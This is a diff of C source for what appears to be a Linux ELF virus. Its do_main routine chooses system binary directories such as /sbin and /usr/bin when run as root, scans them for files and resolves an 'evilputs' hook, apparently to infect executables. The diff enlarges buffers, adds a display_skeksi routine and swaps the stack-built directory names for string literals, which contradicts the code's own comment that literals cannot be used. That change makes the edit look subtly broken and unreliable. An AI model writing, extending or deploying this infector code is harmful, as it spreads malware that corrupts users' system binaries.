@@ -83,6 +83,7 @@ unsigned long get_rip(void);
 void end_code(void);
 void dummy_marker(void);
 static inline uint32_t get_random_number(int) __attribute__((__always_inline__));
+void display_skeksi(void);
 
 #define PIC_RESOLVE_ADDR(target) (get_rip() - ((char *)&get_rip_label - (char *)target))
 
@@ -254,23 +255,22 @@ normal:
 void * vx_malloc(size_t len, uint8_t **mem)
 {
 	if (*mem == NULL) {
-		*mem = _mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+		*mem = _mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
 		if (*mem == MAP_FAILED) {
 			DEBUG_PRINT("malloc failed with mmap\n");
 			Exit(-1);
 		}
 	}
 	*mem += len;
-	**mem = 0;
 	return (void *)((char *)*mem - len);
 }
 
 static inline void vx_free(uint8_t *mem)
 {
 	uintptr_t addr = (uintptr_t)mem;
-	addr &= ~4095;
+	addr &= ~8191;
 	mem = (uint8_t *)addr;
-	_munmap(mem, 4096);
+	_munmap(mem, 8192);
 }
 
 static inline int _rand(long *seed) // RAND_MAX assumed to be 32767
@@ -692,7 +692,7 @@ void do_main(struct bootstrap_data *bootstrap)
 	long new_base, base_addr, evilputs_addr, evilputs_offset;
 	struct linux_dirent64 *d;
 	int bpos, fcount, dd, nread;
-	char *dir = NULL, **files, *fpath, dbuf[1024];
+	char *dir = NULL, **files, *fpath, dbuf[32768];
 	struct stat st;
 	mode_t mode;
 	uint32_t rnum;
@@ -704,12 +704,7 @@ void do_main(struct bootstrap_data *bootstrap)
 	 * we can't use string literals because they will be
 	 * stored in either .rodata or .data sections.
 	 */
-	char dirs[4][32] = {
-			{'/','s','b','i','n','\0'},
-			{'/','u','s','r','/','b','i','n','\0'},
-			{'/','u','s','r','/','s','b','i','n','\0'},        
-			{'/','b','i','n','\0'}
-			};
+	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" };
 	char cwd[2] = {'.', '\0'};
 	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
 	
@@ -732,7 +727,7 @@ void do_main(struct bootstrap_data *bootstrap)
 #endif
 
 	for (;;) {
-		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 4096);
+		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768);
 		if (nread < 0) {
 			DEBUG_PRINT("getdents64 failed\n");
 			return;
